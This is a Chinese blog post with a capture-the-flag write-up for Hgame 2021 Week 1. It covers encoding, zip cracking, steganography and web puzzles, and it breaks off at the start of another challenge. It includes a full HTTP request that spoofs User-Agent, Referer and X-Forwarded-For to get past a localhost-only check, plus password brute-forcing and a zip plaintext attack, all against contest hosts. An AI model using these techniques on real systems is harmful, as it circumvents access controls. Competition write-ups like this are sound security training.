<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF | 2021 Hgame Week1 WriteUp, MiaoTony,blog">
    <meta name="description" content="又是一年一度杭电举办的Hgame，感觉今年来的人更多了。题目还是挺有趣也有些梯度的，第一周做了不少题，这里来写写WriteUp。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>CTF | 2021 Hgame Week1 WriteUp | MiaoTony&#39;s小窝</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/favicon.ico">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my.css">
	
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/jquery/jquery.min.js"></script>
    <script>
        //来个特效玩玩喵 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|ω·) 喵~快回来呀！';
                clearTimeout(titleTime);
            } else {
                document.title = '(/≧▽≦)/ Meow！';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 5.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;s小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;s小窝</div>
        <div class="logo-desc">
            
            喵~欢迎各位大佬的来访呀！
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/21.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF | 2021 Hgame Week1 WriteUp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-02-07
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    5.9k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    30 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><img src="/2021/02/07/CTF_2021HgameWeek1/logo.png"></p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>一年一度，由杭州电子科技大学 Vidar Team 举办的 Hgame 又来了！</p>
<p>今年和往年一样，持续四周，是招新赛，不过感觉今年人更多了。</p>
<p>题目倒挺有趣味也有梯度的，正好就来看看了。</p>
<p>这篇就是第一周的 WriteUp 啦。</p>
<blockquote>
<p>其实去年也来了，但貌似看了第一周后面就没怎么看，或者没写 WriteUp了</p>
<p>想回顾可以移步 <a href="https://miaotony.xyz/2020/01/23/CTF_Hgame2020/">CTF | Hgame2020 Week1 WriteUp</a>.</p>
<p><em>（说好的 未完待续，果然咕掉了。</em></p>
<p><em>后面几周可能也不一定有空来看题了，不知道能坚持几周了 233</em></p>
</blockquote>
<blockquote>
<p><strong>平台：</strong> <a target="_blank" rel="noopener" href="https://hgame.vidar.club/">https://hgame.vidar.club/</a></p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><blockquote>
<p>新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ </p>
<p>R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</p>
</blockquote>
<p>老套路了。</p>
<p>Base64 =&gt; Base32 =&gt; Base16/Hex</p>
<p><code>hgame{We1c0me_t0_HG4M3_2021}</code></p>
<h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><blockquote>
<p>0x4qE给了张图给我，说这图暗藏玄机，你能帮我找出来吗？</p>
</blockquote>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/0x4qE_112d64bd3834986084be726095957b5d.jpg" alt="0x4qE"></p>
<p>提取拼接的压缩包，备注提示</p>
<blockquote>
<p>Password is picture ID (Up to 8 digits)</p>
</blockquote>
<p>盲猜是 P站某张图片的ID，不过这里懒了，直接爆破好了。</p>
<p>得到密码为 <code>70415155</code></p>
<p>解压得到 <code>NO PASSWORD.txt</code></p>
<pre class="language-none"><code class="language-none">Sometimes we don't need to care about password.
Because it's too strong or null. XD
By the way, I only use storage.</code></pre>
<p>以及一个 <code>plain.zip</code></p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201025347818.png"></p>
<p>明文攻击啦。</p>
<p>注意要先把 <code>NO PASSWORD.txt</code> 打包成压缩包，但是不压缩。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201025323748.png"></p>
<p><code>C8uvP$DP</code></p>
<p>得到 <code>flag.zip</code>，伪加密。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201025615004.png"></p>
<p>其实不改也行，没加密的情况下文件名后面这段就是明文的。</p>
<pre class="language-none"><code class="language-none">&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;</code></pre>
<p>HTML 实体</p>
<p><code>hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d}</code></p>
<h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><p>下载下来流量包，提取下得到一张图。</p>
<p><em>（噢，出题人在百度搜图啊</em></p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201024137587.png"></p>
<p>没看到有拼接隐写，但是经典套路，改高度就好了。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201023916817.png" alt="flag"></p>
<p><code>hgame{Wh4t_A_W0nderfu1_Wa11paper}</code></p>
<h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>草，这张图有毒……</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201031506012.png" alt="first"></p>
<p><code>first.docx</code> 藏了一个 <code>password.xml</code></p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201030419914.png" alt="password"></p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>++</span> <span class="token attr-name">+[-</span><span class="token punctuation">&gt;</span></span>+ ++<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span><span class="token punctuation">&gt;</span></span> ++.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+</span> <span class="token attr-name">++[-</span><span class="token punctuation">&gt;</span></span> +++<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span> <span class="token punctuation">&gt;</span></span>+.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+</span> <span class="token attr-name">++[-</span><span class="token punctuation">&gt;</span></span> ---<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span> <span class="token punctuation">&gt;</span></span>-.++ ++++. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+++[</span> <span class="token attr-name">-</span><span class="token punctuation">&gt;</span></span>--- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span><span class="token punctuation">&gt;</span></span>-. +++.+ .++++ ++++. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+++[</span> <span class="token attr-name">-</span><span class="token punctuation">&gt;</span></span>--- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span><span class="token punctuation">&gt;</span></span>-- ----. +.--- --..+ .++++ +++++ .<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+++</span> <span class="token attr-name">[-</span><span class="token punctuation">&gt;</span></span>-- -<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span><span class="token punctuation">&gt;</span></span>- ----- .&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>Brainfuck 跑一跑</p>
<p>（<a target="_blank" rel="noopener" href="https://fatiherikli.github.io/brainfuck-visualizer/#KysrKysgKysrWy0gPisrKysgKysrKzwgXT4rKysgKy48KysgK1stPisgKys8XT4gKysuPCsgKytbLT4gKysrPF0gPisuPCsgKytbLT4gLS0tPF0gPi0uKysgKysrKy4gPCsrK1sgLT4tLS0gPF0+LS4gKysrLisgLisrKysgKysrKy4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gKy4tLS0gLS0uLisgLisrKysgKysrKysgLjwrKysgWy0+LS0gLTxdPi0gLS0tLS0gLjw=">这个工具</a> 可视化挺好的</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201030512570.png" alt="Brainfuck"></p>
<p><code>DOYOUKNOWHIDDEN?</code></p>
<p>拿去开 <code>maimai.docx</code></p>
<p>里面有张图片</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/1.jpg"></p>
<p>噢不对，下面还有隐藏文字。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201153437500.png"></p>
<p>这首歌叫 <strong>好き！雪！本気マジック</strong>（卧槽！下雪了！牛逼啊）</p>
<p>可以来听一听 =&gt; <a target="_blank" rel="noopener" href="https://music.163.com/#/search/m/?s=%E5%A5%BD%E3%81%8D%EF%BC%81%E9%9B%AA%EF%BC%81%E6%9C%AC%E6%B0%97%E3%83%9E%E3%82%B8%E3%83%83%E3%82%AF&amp;type=1">网易云</a>， <a target="_blank" rel="noopener" href="https://y.qq.com/n/yqq/song/0016KLSc0A6gyM.html">QQ 音乐</a>，还挺不错的。</p>
<p><em>（当然评论也没啥东西</em></p>
<p>Tab 和 空格 交错的，是下面这一段，<del>盲猜是零宽字符隐写</del>，但不是零宽字符。</p>
<pre class="language-none"><code class="language-none">	 	  	       	  	     	     	   	   	  
 	       	 	    	      		       		     	  
 	     	     	    	      	   		  	  	 
    	 	     	       	       	    	      		 	 
  	      	 	 	     	  	   	       	       	 
  	      	 	    	  	      	     	    	      	     
    	     	    		  	 	       		     	    
   	       	       	 	  	      	 	    	  	      
     	    	   	    	  	      	     	    	     	    
	  	   		  	     	 		     	      
	    	    	    	   	       	  	
</code></pre>
<p>试着把 tab 当作1，空格当作0</p>
<pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""..."""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'\x09'</span><span class="token punctuation">:</span>
        <span class="token comment"># Tab</span>
        x <span class="token operator">+=</span> <span class="token string">'0'</span>
    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token string">'\x20'</span><span class="token punctuation">:</span>
        <span class="token comment"># Space</span>
        x <span class="token operator">+=</span> <span class="token string">'1'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token comment"># 0101101111111011011111011111011101110110111101111011110111011111110110</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># 0110111111101110111101111011110110111011101111101111101101111111011010</span></code></pre>
<p>再转 ASCII，发现明显不对。</p>
<p>然后再看图，下雪了，查一下，发现果然有种空白字符的隐写方式 叫 SNOW。</p>
<p>先是看到了 <a target="_blank" rel="noopener" href="http://www.diglog.com/story/1044931.html">雪-空白隐写术（2013）</a> 这篇介绍。</p>
<p>然后找到官网 <a target="_blank" rel="noopener" href="http://darkside.com.au/snow/">The SNOW Home Page</a></p>
<blockquote>
<p><strong>Whitespace steganography</strong></p>
<p>​      The program SNOW is used to conceal messages in ASCII text by      appending whitespace to the end of lines. Because spaces and tabs      are generally not visible in text viewers, the message is      effectively hidden from casual observers. And if the built-in      encryption is used, the message cannot be read even if it is detected.    </p>
</blockquote>
<p>这个加密 2013 年基于 Apache 2.0 协议可用</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201194756190.png"></p>
<p>看了看文档，巨古老（</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ SNOW.exe -C text.txt
hgame<span class="token punctuation">{</span>Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX<span class="token punctuation">}</span></code></pre>


<blockquote>
<p><strong>Extensive Reading:</strong></p>
<p>BTW，零宽字符隐写的</p>
<p>Ga1@xy 师傅的 <a target="_blank" rel="noopener" href="http://www.ga1axy.top/index.php/archives/20/">浅谈基于零宽度字符的隐写方式</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Amherstieae/article/details/108909743">misc学习笔记1-txt零宽度字符隐写</a></p>
<p><strong>Some online tools:</strong></p>
<p><a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">zero-width-lib</a></p>
<p><a target="_blank" rel="noopener" href="https://offdev.net/demos/zwsp-steg-js">zwsp-steg-js</a></p>
<p><a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a></p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><blockquote>
<p>第一次在银河系里搭顺风车，要准备啥，在线等，挺急的</p>
<p><a target="_blank" rel="noopener" href="http://5f517db502.hitchhiker42.0727.site:42420/">http://5f517db502.hitchhiker42.0727.site:42420</a> </p>
</blockquote>
<p>访问提示</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210131015723955.png"></p>
<p>搭个顺风车，访问 <code>/HitchhikerGuide.php</code>，发现302到主页 <code>index.php</code> 了。</p>
<p>改成 POST。</p>
<p>然后一系列的套路啦。</p>
<blockquote>
<p>​    只有使用”无限非概率引擎”(Infinite Improbability Drive)才能访问这里～</p>
</blockquote>
<blockquote>
<p>​    你知道吗？<a target="_blank" rel="noopener" href="https://github.com/wuhan005">茄子</a>特别要求：你得从他的<a target="_blank" rel="noopener" href="https://cardinal.ink/">Cardinal</a>过来</p>
</blockquote>
<blockquote>
<p>​    flag仅能通过本地访问获得</p>
</blockquote>
<p>最后的 payload 如下。</p>
<pre class="language-none"><code class="language-none">POST /HitchhikerGuide.php HTTP/1.1
Host: 5f517db502.hitchhiker42.0727.site:42420
User-Agent: Infinite Improbability Drive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://cardinal.ink/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Origin: http://5f517db502.hitchhiker42.0727.site:42420
Content-Length: 0
X-Forwarded-For: 127.0.0.1</code></pre>
<p><code>hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!}</code></p>
<h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p><a target="_blank" rel="noopener" href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p>
<p>噢，合成大西瓜啊，其实先是玩了挺久甚至有点上瘾<em>（大雾</em></p>
<p>看到失败了会提示 “达到两千分就可以得到flag”。</p>
<p>下面开始解题，看了看 network，巨多文件，不过有用的并不多，大部分是图片音频什么的。</p>
<p>先全局搜了一下，没找到 <code>flag</code>，<code>hgame</code> 也没有。</p>
<p>关键的部分包括 <code>index.html</code>、配置 <code>settings.js</code>、 <code>project.js</code>、<del>还有广告 <code>ads.js</code></del><em>（他注释掉了</em></p>
<p>随意看了一下发现打包的有点好，手解不方便，console 调试也比较麻烦。</p>
<p>心想着出题人应该是直接魔改的源码，然后去找源码了。</p>
<p>在 GitHub 上找到了 原版和魔改版的源码 repo <a target="_blank" rel="noopener" href="https://github.com/xiaopengand/daxigua">https://github.com/xiaopengand/daxigua</a></p>
<p>再比对一下，找到了可以的部分了。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201170510561.png" alt="修改的源码"></p>
<p>其实全局搜 <code>gameover</code> 也能找到，233.</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201170748014.png" alt="flag"></p>
<p><code>hgame{do_you_know_cocos_game?}</code></p>
<p>其实直接 base64 解密一下也行。</p>
<p>（噢，cocos 游戏引擎啊</p>
<h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><blockquote>
<p>又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目）</p>
<p><a target="_blank" rel="noopener" href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p>
</blockquote>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201181304937.png" alt="题目"></p>
<p>又是 积分高数题啊，想起了 <a href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/#%E8%B6%85%E5%9F%BA%E7%A1%80%E7%9A%84%E6%95%B0%E7%90%86%E6%A8%A1%E6%8B%9F%E5%99%A8">USTC Hackergame 那道 超基础的数理模拟器</a>……</p>
